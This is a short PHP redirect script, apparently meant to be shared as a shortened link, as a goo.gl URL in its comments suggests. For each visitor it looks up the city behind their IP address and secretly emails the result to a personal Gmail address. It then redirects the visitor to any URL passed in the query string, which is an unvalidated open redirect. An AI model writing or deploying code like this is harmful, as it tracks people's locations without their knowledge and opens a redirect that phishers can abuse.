<?php
//http://api.mkgalaxy.com/ipurl.php?url=https://en.wikipedia.org/wiki/City_of_Angels_(film)
//http://goo.gl/eCGKlX

try {
  include('init.php');
  //pre defined variables
  $return['success'] = 1;
  $ip = !empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR'];
  $return['data'] = iptocity($ip);
  mail('naveenkhanchandani@gmail.com', 'ip from '.$ip, var_export($return, 1));
} catch (Exception $e) {
  
}
$url = $_GET['url'];
header("Location: ".$url);//https://www.youtube.com/results?search_query=kizomba
exit;
?>